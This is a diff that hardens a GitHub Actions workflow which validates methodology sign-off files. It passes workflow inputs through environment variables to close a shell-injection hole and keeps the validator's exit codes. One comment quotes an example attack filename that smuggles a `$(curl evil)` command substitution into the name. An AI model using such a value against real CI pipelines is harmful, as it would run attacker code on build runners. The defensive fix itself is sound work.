@@ -102,6 +102,11 @@ jobs:
 
       - name: Verify validator source provenance
         working-directory: validator-source
+        env:
+          # Issue #192 codex pass-1 HIGH-2 hardening: route validator_ref
+          # through env so it cannot be a shell-injection sink even
+          # though actions/checkout above already validated it.
+          VALIDATOR_REF: ${{ inputs.validator_ref }}
         run: |
           set -euo pipefail
           # Defensive log: surface which ref the validator was loaded from
@@ -112,11 +117,11 @@ jobs:
           # to handle force-pushes); branch protection on `main` is the
           # primary defense.
           VALIDATOR_SHA=$(git rev-parse HEAD)
-          echo "validator_ref=${{ inputs.validator_ref }}"
+          echo "validator_ref=${VALIDATOR_REF}"
           echo "validator_sha=${VALIDATOR_SHA}"
           echo "validator_path=scripts/check_methodology_signoff.py"
           if [ ! -f scripts/check_methodology_signoff.py ]; then
-            echo "::error::validator script not found at protected ref ${{ inputs.validator_ref }}@${VALIDATOR_SHA}"
+            echo "::error::validator script not found at protected ref ${VALIDATOR_REF}@${VALIDATOR_SHA}"
             exit 1
           fi
           # Compute and log the validator's content SHA so post-incident
@@ -139,6 +144,22 @@ jobs:
           # The selection-rule check shells out to git log; the
           # PR-checkout workspace is the natural --repo-root.
           REPO_ROOT: ${{ github.workspace }}/pr-checkout
+          # Issue #192 codex pass-1 HIGH-2 fix: route the touched_files
+          # input through `env` so it is exposed as a shell variable
+          # *after* the shell has parsed the script. Direct
+          # ${{ inputs.touched_files }} interpolation into a here-string
+          # would be a shell-injection sink — a PR can add a file matching
+          # the workflow's broad path glob with a name like
+          # `optum_methodology_signoff_$(curl evil).md`; expression
+          # substitution happens before bash parses the line, so the
+          # command-substitution would execute. Routing through `env`
+          # shifts the value into a shell variable that bash treats as
+          # data, never as code. The validator's filename pattern
+          # (FILENAME_PATTERN regex) rejects such filenames downstream,
+          # but we MUST defend BEFORE invoking the validator.
+          TOUCHED_FILES: ${{ inputs.touched_files }}
+          VALIDATOR_REF: ${{ inputs.validator_ref }}
+          VALIDATOR_PATH_ABS: ${{ github.workspace }}/validator-source/scripts/check_methodology_signoff.py
         working-directory: pr-checkout
         run: |
           set -euo pipefail
@@ -151,39 +172,58 @@ jobs:
             if gh auth status >/dev/null 2>&1; then
               echo "gh CLI: available + authenticated"
             else
-              echo "::warning::gh CLI is on PATH but `gh auth status` failed; STRICT_GH=${STRICT_GH} may trigger validator exit 3"
+              echo "::warning::gh CLI is on PATH but \`gh auth status\` failed; STRICT_GH=${STRICT_GH} may trigger validator exit 3"
             fi
           else
             echo "::warning::gh CLI is NOT on PATH on this runner; STRICT_GH=${STRICT_GH} may trigger validator exit 3"
           fi
 
+          # Issue #192 codex pass-1 LOW-4 fix: preserve the validator's
+          # exit-code-3 (STRICT_GH provenance gap) signal up to the job
+          # exit code. Previously the `if ! python3 ...; then STATUS=1`
+          # pattern collapsed every non-zero into 1, undercutting the
+          # exit-code contract for log scrapers. The new approach uses
+          # PIPESTATUS to capture the validator's actual exit code AND
+          # picks the highest-priority code (1 wins over 3 wins over 0)
+          # so a generic-validation-failure on one artifact still bubbles
+          # up correctly even when a sibling artifact failed strict-gh.
           STATUS=0
-          # Capture combined output across all artifacts so the next step
-          # can scan for the M1 CRITICAL marker.
           : > /tmp/validator_output.txt
 
-          VALIDATOR_PATH="${{ github.workspace }}/validator-source/scripts/check_methodology_signoff.py"
-          echo "Using validator from: $VALIDATOR_PATH (ref=${{ inputs.validator_ref }})"
+          echo "Using validator from: ${VALIDATOR_PATH_ABS} (ref=${VALIDATOR_REF})"
 
-          # Read newline-separated touched_files input.
+          # Issue #192 codex pass-1 HIGH-2 fix: iterate from the env-var
+          # TOUCHED_FILES rather than from a here-string interpolated by
+          # GitHub Actions expression substitution. This eliminates the
+          # shell-injection vector entirely — bash never sees the input
+          # text at parse time.
           while IFS= read -r ARTIFACT; do
             [ -z "$ARTIFACT" ] && continue
             echo "::group::Validating $ARTIFACT"
             # Run validator from the protected-ref source against the
-            # PR-checkout artifact. --strict-gh is set via STRICT_GH=1
-            # env var (the validator honors both CLI flag and env).
-            if ! python3 "$VALIDATOR_PATH" \
+            # PR-checkout artifact. --strict-gh is set via STRICT_GH env
+            # var (the validator honors both CLI flag and env).
+            python3 "${VALIDATOR_PATH_ABS}" \
                   --repo-root "$REPO_ROOT" \
                   --require-signature \
-                  "$ARTIFACT" 2>&1 | tee -a /tmp/validator_output.txt; then
-              # Capture the exit code for explicit reporting. Note the
-              # `tee` above uses pipefail (set -o pipefail at top) so a
-              # non-zero from python3 reaches the `if` check.
-              echo "::error file=$ARTIFACT::methodology sign-off validation failed (see log; exit code 3 = STRICT_GH provenance gap)"
-              STATUS=1
+                  "$ARTIFACT" 2>&1 | tee -a /tmp/validator_output.txt
+            # PIPESTATUS[0] = validator exit; PIPESTATUS[1] = tee exit.
+            # We only care about the validator. With set -o pipefail,
+            # tee inherits the validator's status, but reading
+            # PIPESTATUS[0] directly avoids the "tee succeeded but
+            # validator failed" ambiguity and lets us preserve exit 3
+            # vs exit 1.
+            ARTIFACT_RC=${PIPESTATUS[0]}
+            if [ "$ARTIFACT_RC" -ne 0 ]; then
+              echo "::error file=$ARTIFACT::methodology sign-off validation failed (rc=$ARTIFACT_RC; rc=3 = STRICT_GH provenance gap)"
+              # Priority: rc=1 (generic validation fail) > rc=3
+              # (strict-gh) > 0. Mirrors the Python main()'s precedence.
+              if [ "$STATUS" -ne 1 ] && [ "$ARTIFACT_RC" -gt "$STATUS" ]; then
+                STATUS="$ARTIFACT_RC"
+              fi
             fi
             echo "::endgroup::"
-          done <<< "${{ inputs.touched_files }}"
+          done <<< "$TOUCHED_FILES"
 
           # iter-3 M1: surface the CRITICAL provenance-skip marker even
           # when STRICT_GH=0 (back-compat path). When STRICT_GH=1, the
@@ -197,14 +237,24 @@ jobs:
 
       - name: Summary
         if: always()
+        env:
+          # Issue #192 codex pass-1 HIGH-2 hardening: route every input
+          # through env so the Summary step (which writes to
+          # GITHUB_STEP_SUMMARY) is also free of GitHub-Actions
+          # expression-substitution sinks.
+          VALIDATOR_REF: ${{ inputs.validator_ref }}
+          STRICT_GH: ${{ inputs.strict_gh }}
+          TOUCHED_FILES: ${{ inputs.touched_files }}
         run: |
-          echo "## Methodology Sign-off Guard" >> "$GITHUB_STEP_SUMMARY"
-          echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo "**Validator source ref:** \`${{ inputs.validator_ref }}\` (issue #192 H3)" >> "$GITHUB_STEP_SUMMARY"
-          echo "**STRICT_GH:** \`${{ inputs.strict_gh }}\` (issue #192 H2/M1)" >> "$GITHUB_STEP_SUMMARY"
-          echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo "Artifacts validated:" >> "$GITHUB_STEP_SUMMARY"
-          echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo '```' >> "$GITHUB_STEP_SUMMARY"
-          echo "${{ inputs.touched_files }}" >> "$GITHUB_STEP_SUMMARY"
-          echo '```' >> "$GITHUB_STEP_SUMMARY"
+          {
+            echo "## Methodology Sign-off Guard"
+            echo ""
+            echo "**Validator source ref:** \`${VALIDATOR_REF}\` (issue #192 H3)"
+            echo "**STRICT_GH:** \`${STRICT_GH}\` (issue #192 H2/M1)"
+            echo ""
+            echo "Artifacts validated:"
+            echo ""
+            echo '```'
+            printf '%s\n' "$TOUCHED_FILES"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
